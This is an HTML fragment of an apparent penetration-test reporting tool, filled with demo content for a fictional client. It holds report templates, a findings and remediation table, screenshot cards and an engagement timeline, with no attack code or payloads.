                                <div id="reportSectionContent" style="flex: 1; padding: 1.5rem; overflow-y: auto;">
                                    <!-- High Level Summary Template -->
                                    <div id="high-level-content" class="section-content active">
                                        <div style="margin-bottom: 2rem;">
                                            <h4 style="color: var(--text-primary); margin-bottom: 1rem;">Template Variables</h4>
                                            <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border);">
                                                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
                                                    <div class="form-group">
                                                        <label class="form-label">Client Company</label>
                                                        <input type="text" class="form-input" id="clientCompany" placeholder="{{CLIENT_COMPANY}}" value="TechCorp Industries">
                                                    </div>
                                                    <div class="form-group">
                                                        <label class="form-label">Target</label>
                                                        <input type="text" class="form-input" id="target" placeholder="{{TARGET}}" value="External Web Application">
                                                    </div>
                                                    <div class="form-group">
                                                        <label class="form-label">Security Posture</label>
                                                        <select class="form-select" id="posture">
                                                            <option value="Strong">Strong</option>
                                                            <option value="Moderate" selected>Moderate</option>
                                                            <option value="Weak">Weak</option>
                                                        </select>
                                                    </div>
                                                    <div class="form-group">
                                                        <label class="form-label">Test Duration</label>
                                                        <input type="text" class="form-input" id="duration" placeholder="{{DURATION}}" value="5 days">
                                                    </div>
                                                    <div class="form-group">
                                                        <label class="form-label">Critical Findings</label>
                                                        <input type="number" class="form-input" id="criticalFindings" placeholder="{{CRITICAL_COUNT}}" value="2">
                                                    </div>
                                                    <div class="form-group">
                                                        <label class="form-label">High Findings</label>
                                                        <input type="number" class="form-input" id="highFindings" placeholder="{{HIGH_COUNT}}" value="5">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div>
                                            <h4 style="color: var(--text-primary); margin-bottom: 1rem;">Template Preview</h4>
                                            <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border); line-height: 1.8;">
                                                <div id="templatePreview" style="color: var(--text-primary);">
                                                    <p><strong>{{CLIENT_COMPANY}}</strong> engaged our security team to conduct a comprehensive penetration test of their <strong>{{TARGET}}</strong>. The assessment was performed over <strong>{{DURATION}}</strong> and identified several security concerns requiring immediate attention.</p>
                                                    
                                                    <p>Overall, <strong>{{CLIENT_COMPANY}}</strong>'s security posture is considered <strong>{{POSTURE}}</strong>. The testing revealed <strong>{{CRITICAL_COUNT}}</strong> critical vulnerabilities and <strong>{{HIGH_COUNT}}</strong> high-risk findings that should be prioritized for remediation.</p>
                                                    
                                                    <p>This report provides executive-level visibility into the security findings and recommended next steps for improving the organization's security posture.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Executive Summary Free Text -->
                                    <div id="executive-content" class="section-content" style="display: none;">
                                        <div style="margin-bottom: 1rem;">
                                            <h4 style="color: var(--text-primary); margin-bottom: 0.5rem;">Executive Summary</h4>
                                            <p style="color: var(--text-secondary); font-size: 0.875rem;">Provide a high-level overview of the security assessment, key findings, and business impact.</p>
                                        </div>
                                        
                                        <div class="form-group">
                                            <textarea class="form-textarea" id="executiveSummaryText" style="min-height: 300px;" placeholder="Enter executive summary content...">The penetration testing engagement for TechCorp Industries revealed several critical security vulnerabilities that require immediate attention. The most significant findings include SQL injection vulnerabilities in the customer portal and inadequate access controls in the administrative interface.

From a business perspective, these vulnerabilities expose customer data and could result in significant financial and reputational damage if exploited. The SQL injection vulnerabilities allow attackers to access and modify sensitive customer information, while the access control issues could enable unauthorized administrative access.

We recommend prioritizing the remediation of critical and high-risk findings within the next 30 days, followed by a comprehensive security program review to prevent similar issues in the future.</textarea>
                                        </div>
                                        
                                        <div style="display: flex; gap: 0.5rem; margin-top: 1rem;">
                                            <button class="btn-secondary" onclick="insertScreenshotIntoText('executiveSummaryText')"> Insert Screenshot</button>
                                            <button class="btn-secondary" onclick="formatText('executiveSummaryText', 'bold')"><strong>B</strong></button>
                                            <button class="btn-secondary" onclick="formatText('executiveSummaryText', 'italic')"><em>I</em></button>
                                        </div>
                                    </div>
                                    
                                    <!-- Findings Table (Auto-generated) -->
                                    <div id="findings-table-content" class="section-content" style="display: none;">
                                        <div style="margin-bottom: 1rem;">
                                            <h4 style="color: var(--text-primary); margin-bottom: 0.5rem;">Findings Summary Table</h4>
                                            <p style="color: var(--text-secondary); font-size: 0.875rem;">This table is automatically generated from your findings. Use the filters below to customize which findings are included.</p>
                                        </div>
                                        
                                        <div style="margin-bottom: 1.5rem;">
                                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1rem;">
                                                <div class="form-group">
                                                    <label class="form-label">Include Severity</label>
                                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                                        <label class="checkbox-label">
                                                            <input type="checkbox" checked> Critical
                                                        </label>
                                                        <label class="checkbox-label">
                                                            <input type="checkbox" checked> High
                                                        </label>
                                                        <label class="checkbox-label">
                                                            <input type="checkbox" checked> Medium
                                                        </label>
                                                        <label class="checkbox-label">
                                                            <input type="checkbox"> Low
                                                        </label>
                                                    </div>
                                                </div>
                                                
                                                <div class="form-group">
                                                    <label class="form-label">Include Categories</label>
                                                    <select class="form-select" multiple>
                                                        <option selected>Web Application</option>
                                                        <option selected>Infrastructure</option>
                                                        <option>Mobile</option>
                                                        <option>Network</option>
                                                    </select>
                                                </div>
                                            </div>
                                            
                                            <button class="btn-secondary" onclick="regenerateFindingsTable()"> Regenerate Table</button>
                                        </div>
                                        
                                        <div style="background: var(--bg-primary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                            <table class="data-table" style="width: 100%;">
                                                <thead>
                                                    <tr>
                                                        <th>Finding</th>
                                                        <th>Severity</th>
                                                        <th>Category</th>
                                                        <th>Status</th>
                                                        <th>CVSS</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <tr>
                                                        <td>SQL Injection in Customer Portal</td>
                                                        <td><span class="severity-badge critical">Critical</span></td>
                                                        <td>Web Application</td>
                                                        <td><span class="status-badge open">Open</span></td>
                                                        <td>9.1</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Inadequate Access Controls</td>
                                                        <td><span class="severity-badge critical">Critical</span></td>
                                                        <td>Web Application</td>
                                                        <td><span class="status-badge open">Open</span></td>
                                                        <td>8.8</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Cross-Site Scripting (XSS)</td>
                                                        <td><span class="severity-badge high">High</span></td>
                                                        <td>Web Application</td>
                                                        <td><span class="status-badge open">Open</span></td>
                                                        <td>7.2</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Weak Password Policy</td>
                                                        <td><span class="severity-badge medium">Medium</span></td>
                                                        <td>Infrastructure</td>
                                                        <td><span class="status-badge open">Open</span></td>
                                                        <td>5.4</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Missing Security Headers</td>
                                                        <td><span class="severity-badge medium">Medium</span></td>
                                                        <td>Web Application</td>
                                                        <td><span class="status-badge open">Open</span></td>
                                                        <td>4.6</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                    
                                    <!-- Next Steps Structured -->
                                    <div id="next-steps-content" class="section-content" style="display: none;">
                                        <div style="margin-bottom: 1rem;">
                                            <h4 style="color: var(--text-primary); margin-bottom: 0.5rem;">Next Steps & Recommendations</h4>
                                            <p style="color: var(--text-secondary); font-size: 0.875rem;">Define specific actions, responsibilities, and priorities for addressing identified security issues.</p>
                                        </div>
                                        
                                        <div style="margin-bottom: 1rem;">
                                            <button class="action-btn secondary" onclick="addNextStep()">+ Add Step</button>
                                            <button class="btn-secondary" onclick="importFromFindings()"> Import from Findings</button>
                                        </div>
                                        
                                        <div id="nextStepsList" style="background: var(--bg-primary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                            <table class="data-table" style="width: 100%;">
                                                <thead>
                                                    <tr>
                                                        <th style="width: 40%;">Activity</th>
                                                        <th style="width: 35%;">Description</th>
                                                        <th style="width: 15%;">Priority</th>
                                                        <th style="width: 10%;">Actions</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <input type="text" class="form-input" value="Remediate SQL Injection Vulnerabilities" style="border: none; background: transparent;">
                                                        </td>
                                                        <td>
                                                            <textarea class="form-textarea" style="border: none; background: transparent; min-height: 60px; resize: vertical;">Implement parameterized queries and input validation to prevent SQL injection attacks in the customer portal.</textarea>
                                                        </td>
                                                        <td>
                                                            <select class="form-select" style="border: none; background: transparent;">
                                                                <option value="critical" selected>Critical</option>
                                                                <option value="high">High</option>
                                                                <option value="medium">Medium</option>
                                                                <option value="low">Low</option>
                                                            </select>
                                                        </td>
                                                        <td>
                                                            <button class="table-btn" onclick="removeNextStep(this)" title="Remove"></button>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <input type="text" class="form-input" value="Implement Access Controls" style="border: none; background: transparent;">
                                                        </td>
                                                        <td>
                                                            <textarea class="form-textarea" style="border: none; background: transparent; min-height: 60px; resize: vertical;">Review and strengthen access control mechanisms, implement role-based access controls (RBAC).</textarea>
                                                        </td>
                                                        <td>
                                                            <select class="form-select" style="border: none; background: transparent;">
                                                                <option value="critical" selected>Critical</option>
                                                                <option value="high">High</option>
                                                                <option value="medium">Medium</option>
                                                                <option value="low">Low</option>
                                                            </select>
                                                        </td>
                                                        <td>
                                                            <button class="table-btn" onclick="removeNextStep(this)" title="Remove"></button>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <input type="text" class="form-input" value="Security Code Review" style="border: none; background: transparent;">
                                                        </td>
                                                        <td>
                                                            <textarea class="form-textarea" style="border: none; background: transparent; min-height: 60px; resize: vertical;">Conduct comprehensive code review focusing on security best practices and OWASP Top 10.</textarea>
                                                        </td>
                                                        <td>
                                                            <select class="form-select" style="border: none; background: transparent;">
                                                                <option value="critical">Critical</option>
                                                                <option value="high" selected>High</option>
                                                                <option value="medium">Medium</option>
                                                                <option value="low">Low</option>
                                                            </select>
                                                        </td>
                                                        <td>
                                                            <button class="table-btn" onclick="removeNextStep(this)" title="Remove"></button>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                    
                                    <!-- Constraints Free Text -->
                                    <div id="constraints-content" class="section-content" style="display: none;">
                                        <div style="margin-bottom: 1rem;">
                                            <h4 style="color: var(--text-primary); margin-bottom: 0.5rem;">Constraints & Limitations</h4>
                                            <p style="color: var(--text-secondary); font-size: 0.875rem;">Document any testing constraints, limitations, or factors that may have impacted the assessment.</p>
                                        </div>
                                        
                                        <div class="form-group">
                                            <textarea class="form-textarea" id="constraintsText" style="min-height: 250px;" placeholder="Enter constraints and limitations...">The following constraints were identified during the penetration testing engagement:

 Testing was limited to external-facing systems only, internal network segments were not included in scope
 Production systems required careful testing approach to avoid service disruption
 Testing window was limited to business hours (9 AM - 5 PM EST) Monday through Friday
 Social engineering and physical security testing were explicitly excluded from scope
 Certain critical production databases could only be tested in read-only mode
 DoS/DDoS testing was not permitted due to potential service impact

These constraints may have limited the depth of certain testing activities and should be considered when interpreting the results of this assessment.</textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Report Preview Modal -->
                <div class="modal" id="reportPreviewModal" style="display: none;">
                    <div class="modal-content" style="width: 95%; max-width: 1200px; height: 90vh;">
                        <div class="modal-header">
                            <h2> Report Preview - <span id="previewReportTitle">Management Report</span></h2>
                            <div style="display: flex; gap: 0.5rem; align-items: center;">
                                <select id="previewSegments" class="form-select">
                                    <option value="all">All Segments</option>
                                    <option value="external">External Only</option>
                                    <option value="internal">Internal Only</option>
                                    <option value="web">Web App Only</option>
                                    <option value="infrastructure">Infrastructure Only</option>
                                </select>
                                <button class="btn-secondary" onclick="exportPreview()"> Export</button>
                                <span class="close" onclick="closeModal('reportPreviewModal')">&times;</span>
                            </div>
                        </div>
                        
                        <div class="modal-body" style="padding: 0;">
                            <div id="reportPreviewContent" style="background: white; color: #000; padding: 2rem; height: 100%; overflow-y: auto; font-family: Arial, sans-serif; line-height: 1.6;">
                                <!-- Preview content will be generated here -->
                            </div>
                        </div>
                    </div>
                </div>

                <style>
                    .section-item {
                        display: flex;
                        align-items: center;
                        padding: 0.75rem;
                        margin: 0.25rem 0;
                        border-radius: 6px;
                        cursor: pointer;
                        transition: background-color 0.2s ease;
                    }
                    
                    .section-item:hover {
                        background: var(--bg-primary);
                    }
                    
                    .section-item.active {
                        background: var(--button-primary);
                        color: white;
                    }
                    
                    .section-icon {
                        font-size: 1.2rem;
                        margin-right: 0.75rem;
                    }
                    
                    .section-info {
                        flex: 1;
                    }
                    
                    .section-name {
                        font-weight: 500;
                        font-size: 0.875rem;
                        margin-bottom: 0.25rem;
                    }
                    
                    .section-status {
                        font-size: 0.75rem;
                        opacity: 0.8;
                    }
                    
                    .section-content {
                        display: none;
                    }
                    
                    .section-content.active {
                        display: block;
                    }
                    
                    .severity-badge {
                        padding: 0.25rem 0.5rem;
                        border-radius: 4px;
                        font-size: 0.75rem;
                        font-weight: bold;
                        text-transform: uppercase;
                    }
                    
                    .severity-badge.critical {
                        background: #fee2e2;
                        color: #dc2626;
                    }
                    
                    .severity-badge.high {
                        background: #fef3c7;
                        color: #d97706;
                    }
                    
                    .severity-badge.medium {
                        background: #fef3c7;
                        color: #f59e0b;
                    }
                    
                    .status-badge {
                        padding: 0.25rem 0.5rem;
                        border-radius: 4px;
                        font-size: 0.75rem;
                        font-weight: bold;
                    }
                    
                    .status-badge.open {
                        background: #fee2e2;
                        color: #dc2626;
                    }
                    
                    .checkbox-label {
                        display: flex;
                        align-items: center;
                        gap: 0.5rem;
                        font-size: 0.875rem;
                        cursor: pointer;
                    }
                </style>
                
                <div class="screen-content" id="screenshots">
                    <div class="assets-container">
                        <!-- Screenshots Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">47</div>
                                    <div class="summary-label">Total Screenshots</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">12</div>
                                    <div class="summary-label">Untagged</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">35</div>
                                    <div class="summary-label">With Findings</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">8</div>
                                    <div class="summary-label">Edited</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportScreenshots()"> Export All</button>
                                <button class="action-btn secondary" onclick="openBulkEditor()"> Bulk Edit</button>
                                <button class="action-btn primary" onclick="openModal('uploadScreenshotModal')">+ Upload Screenshot</button>
                            </div>
                        </div>

                        <!-- Screenshots Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterScreenshots('all')">All</button>
                                    <button class="filter-btn" onclick="filterScreenshots('web')"> Web</button>
                                    <button class="filter-btn" onclick="filterScreenshots('network')"> Network</button>
                                    <button class="filter-btn" onclick="filterScreenshots('system')"> System</button>
                                    <button class="filter-btn" onclick="filterScreenshots('mobile')"> Mobile</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterScreenshots('edited')">Edited</button>
                                    <button class="filter-btn" onclick="filterScreenshots('raw')">Raw</button>
                                    <button class="filter-btn" onclick="filterScreenshots('redacted')">Redacted</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Findings:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterScreenshots('with-findings')">With Findings</button>
                                    <button class="filter-btn" onclick="filterScreenshots('no-findings')">No Findings</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="screenshotSearch" placeholder="Search by ID, title, caption, or findings..." onkeyup="searchScreenshots()">
                                <button class="search-btn"></button>
                            </div>
                        </div>

                        <!-- View Toggle -->
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                            <div style="display: flex; gap: 0.5rem;">
                                <button class="filter-btn" onclick="setScreenshotView('grid')" style="background: var(--button-primary); color: white;"> Grid</button>
                                <button class="filter-btn" onclick="setScreenshotView('list')"> List</button>
                                <button class="filter-btn" onclick="setScreenshotView('timeline')"> Timeline</button>
                            </div>
                            <select class="form-select" style="width: 150px;" onchange="sortScreenshots(this.value)">
                                <option value="recent">Most Recent</option>
                                <option value="oldest">Oldest First</option>
                                <option value="name">By Name</option>
                                <option value="findings">By Findings</option>
                            </select>
                        </div>

                        <!-- Screenshots Grid View -->
                        <div class="screenshots-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1.5rem;">
                            <!-- Screenshot Card 1 -->
                            <div class="screenshot-card" style="background: var(--bg-secondary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border);">
                                <div class="screenshot-image" style="position: relative; background: #f0f0f0; height: 200px; display: flex; align-items: center; justify-content: center; cursor: pointer;" onclick="openScreenshotEditor('SCR-001')">
                                    <span style="font-size: 3rem; color: #ccc;"></span>
                                    <div style="position: absolute; top: 0.5rem; right: 0.5rem; display: flex; gap: 0.25rem;">
                                        <span class="tag" style="background: var(--success); color: white; font-size: 0.75rem;">Edited</span>
                                        <span class="tag" style="background: var(--danger); color: white; font-size: 0.75rem;">3 Findings</span>
                                    </div>
                                </div>
                                <div style="padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 0.5rem;">
                                        <div>
                                            <div style="font-weight: 600; color: var(--text-primary);">SCR-001</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary);">SQL Injection Error</div>
                                        </div>
                                        <button class="table-btn" onclick="event.stopPropagation(); showScreenshotMenu('SCR-001')" title="More"></button>
                                    </div>
                                    <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.75rem;">Database error message revealing sensitive information about the backend structure.</div>
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.75rem;">
                                        <span class="tag" style="font-size: 0.75rem;">FIND-001</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-002</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-007</span>
                                    </div>
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="table-btn" onclick="event.stopPropagation(); openScreenshotEditor('SCR-001')" title="Edit"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); cloneScreenshot('SCR-001')" title="Clone"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); downloadScreenshot('SCR-001')" title="Download"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Screenshot Card 2 -->
                            <div class="screenshot-card" style="background: var(--bg-secondary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border);">
                                <div class="screenshot-image" style="position: relative; background: #f0f0f0; height: 200px; display: flex; align-items: center; justify-content: center; cursor: pointer;" onclick="openScreenshotEditor('SCR-002')">
                                    <span style="font-size: 3rem; color: #ccc;"></span>
                                    <div style="position: absolute; top: 0.5rem; right: 0.5rem; display: flex; gap: 0.25rem;">
                                        <span class="tag" style="background: var(--warning); color: white; font-size: 0.75rem;">Raw</span>
                                    </div>
                                </div>
                                <div style="padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 0.5rem;">
                                        <div>
                                            <div style="font-weight: 600; color: var(--text-primary);">SCR-002</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary);">Admin Panel Access</div>
                                        </div>
                                        <button class="table-btn" onclick="event.stopPropagation(); showScreenshotMenu('SCR-002')" title="More"></button>
                                    </div>
                                    <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.75rem;">Unauthorized access to admin dashboard showing user management interface.</div>
                                    <div style="border: 1px solid var(--warning); background: var(--bg-warning); padding: 0.5rem; border-radius: 4px; margin-bottom: 0.75rem;">
                                        <div style="font-size: 0.75rem; font-weight: 600; color: var(--warning); margin-bottom: 0.25rem;"> Capture Instructions:</div>
                                        <div style="font-size: 0.75rem;">Navigate to /admin, use default creds (admin:admin), capture full dashboard</div>
                                    </div>
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="table-btn" onclick="event.stopPropagation(); openScreenshotEditor('SCR-002')" title="Edit"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); cloneScreenshot('SCR-002')" title="Clone"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); downloadScreenshot('SCR-002')" title="Download"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Screenshot Card 3 -->
                            <div class="screenshot-card" style="background: var(--bg-secondary); border-radius: 8px; overflow: hidden; border: 1px solid var(--border);">
                                <div class="screenshot-image" style="position: relative; background: #f0f0f0; height: 200px; display: flex; align-items: center; justify-content: center; cursor: pointer;" onclick="openScreenshotEditor('SCR-003')">
                                    <span style="font-size: 3rem; color: #ccc;"></span>
                                    <div style="position: absolute; top: 0.5rem; right: 0.5rem; display: flex; gap: 0.25rem;">
                                        <span class="tag" style="background: var(--text-accent); color: white; font-size: 0.75rem;">Redacted</span>
                                        <span class="tag" style="background: var(--danger); color: white; font-size: 0.75rem;">1 Finding</span>
                                    </div>
                                </div>
                                <div style="padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 0.5rem;">
                                        <div>
                                            <div style="font-weight: 600; color: var(--text-primary);">SCR-003</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary);">Network Scan Results</div>
                                        </div>
                                        <button class="table-btn" onclick="event.stopPropagation(); showScreenshotMenu('SCR-003')" title="More"></button>
                                    </div>
                                    <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.75rem;">Nmap scan showing open ports and services. IP addresses have been redacted.</div>
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.75rem;">
                                        <span class="tag" style="font-size: 0.75rem;">FIND-012</span>
                                    </div>
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="table-btn" onclick="event.stopPropagation(); openScreenshotEditor('SCR-003')" title="Edit"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); cloneScreenshot('SCR-003')" title="Clone"></button>
                                        <button class="table-btn" onclick="event.stopPropagation(); downloadScreenshot('SCR-003')" title="Download"></button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="screenshotsBulkActions" style="display: none; margin-top: 1rem;">
                            <div class="bulk-info">
                                <span id="screenshotsSelectedCount">0</span> screenshots selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkEditScreenshots()">Edit Selected</button>
                                <button class="bulk-btn" onclick="bulkExportScreenshots()">Export Selected</button>
                                <button class="bulk-btn" onclick="bulkTagScreenshots()">Tag Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteScreenshots()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="history">
                    <div class="assets-container">
                        <!-- History Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">12</div>
                                    <div class="summary-label">Total Entries</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">8</div>
                                    <div class="summary-label">Manual</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">4</div>
                                    <div class="summary-label">Automated</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">2</div>
                                    <div class="summary-label">Critical Events</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportHistory()"> Export</button>
                                <button class="action-btn primary" onclick="openModal('addHistoryModal')">+ Add Entry</button>
                            </div>
                        </div>
                        
                        <!-- History Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterHistory('all')">All</button>
                                    <button class="filter-btn" onclick="filterHistory('automated')">Automated</button>
                                    <button class="filter-btn" onclick="filterHistory('manual')">Manual</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterHistory('testing')">Testing</button>
                                    <button class="filter-btn" onclick="filterHistory('finding')">Findings</button>
                                    <button class="filter-btn" onclick="filterHistory('milestone')">Milestones</button>
                                    <button class="filter-btn" onclick="filterHistory('communication')">Communication</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="historySearch" placeholder="Search timeline entries..." onkeyup="searchHistory()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- History Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="historyTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortHistory('time')">Time <span class="sort-arrow"></span></th>
                                        <th onclick="sortHistory('event')">Event <span class="sort-arrow"></span></th>
                                        <th onclick="sortHistory('category')">Category <span class="sort-arrow"></span></th>
                                        <th onclick="sortHistory('type')">Type <span class="sort-arrow"></span></th>
                                        <th>Description</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="asset-row" data-type="automated" data-category="testing">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>15:42 - 15/11/2024</strong></td>
                                        <td><strong>Task: Chase Authorization Form - Completed</strong></td>
                                        <td><span class="tag completed">Task Completed</span></td>
                                        <td><span class="status completed">Automated</span></td>
                                        <td>Received signed authorization letter from Sarah Johnson (CISO)</td>
                                        <td>
                                            <button class="table-btn" disabled style="background: var(--success); color: white;" title="Automated"> Auto</button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="manual" data-category="testing">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>09:15 - 15/11/2024</strong></td>
                                        <td><strong>External Network Scan - Phase 1</strong></td>
                                        <td><span class="tag testing">Testing Started</span></td>
                                        <td><span class="status pending">Manual</span></td>
                                        <td>Commenced external network reconnaissance using Nmap against client IP ranges 203.0.113.0/24. Initial port scan identifies web services on ports 80, 443, 8080</td>
                                        <td>
                                            <button class="table-btn" onclick="editHistoryEntry(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteHistoryEntry(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="automated" data-category="communication">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>14:20 - 14/11/2024</strong></td>
                                        <td><strong>Document Upload Notification</strong></td>
                                        <td><span class="tag communication">Email Sent</span></td>
                                        <td><span class="status completed">Automated</span></td>
                                        <td>Automatically sent notification to Sarah Johnson and David Chen when new authorization document was uploaded to secure portal</td>
                                        <td>
                                            <button class="table-btn" disabled style="background: var(--success); color: white;" title="Automated"> Auto</button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="manual" data-category="finding" style="border-left: 4px solid var(--danger);">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>11:30 - 14/11/2024</strong></td>
                                        <td><strong>SQL Injection Discovered - login.php</strong></td>
                                        <td><span class="tag critical">High Finding</span></td>
                                        <td><span class="status urgent">Manual</span></td>
                                        <td>Identified time-based SQL injection vulnerability in user authentication. Proof of concept developed. Immediate notification sent to David Chen as per emergency contact protocol</td>
                                        <td>
                                            <button class="table-btn" onclick="editHistoryEntry(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteHistoryEntry(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="manual" data-category="milestone">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>17:45 - 13/11/2024</strong></td>
                                        <td><strong>External Testing Phase Complete</strong></td>
                                        <td><span class="tag milestone">Milestone</span></td>
                                        <td><span class="status pending">Manual</span></td>
                                        <td>Completed all external network and web application testing activities. Transitioning to internal network assessment pending VPN access setup</td>
                                        <td>
                                            <button class="table-btn" onclick="editHistoryEntry(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteHistoryEntry(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="automated" data-category="project" style="border-left: 4px solid var(--button-primary);">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>10:00 - 10/11/2024</strong></td>
                                        <td><strong>Project Alpha - Kickoff</strong></td>
                                        <td><span class="tag project">Project Started</span></td>
                                        <td><span class="status completed">Automated</span></td>
                                        <td>Project officially commenced following contract execution and receipt of all required authorizations. Testing window: 10-24 November 2024</td>
                                        <td>
                                            <button class="table-btn" disabled style="background: var(--button-primary); color: white;" title="Automated"> Auto</button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">SQL Injection Discovered</div>
                                        <div class="asset-card-subtitle">14/11/2024 - 11:30</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="tag critical">High Finding</span>
                                        <span class="status urgent">Manual</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="historyBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="historySelectedCount">0</span> entries selected
                            </div>
                            <div class="bulk-buttons">
